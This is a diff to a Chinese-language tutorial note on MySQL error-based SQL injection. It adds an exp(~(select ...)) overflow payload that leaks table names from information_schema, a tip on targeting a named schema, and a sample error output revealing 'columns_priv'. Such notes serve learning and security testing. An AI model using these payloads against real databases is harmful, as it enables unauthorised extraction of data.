@@ -111,7 +111,15 @@ ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localho
 * 得到表名
 
 ```
-select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+select exp(~(select * from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+
+注：
+根据需要替换 **database()** 如: table_schema='mysql'
+```
+
+```
+mysql> select exp(~(select*from(select table_name from information_schema.tables where table_schema='mysql' limit 0,1)x))
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'columns_priv' from dual)))'
 ```
 
 * 得到列名
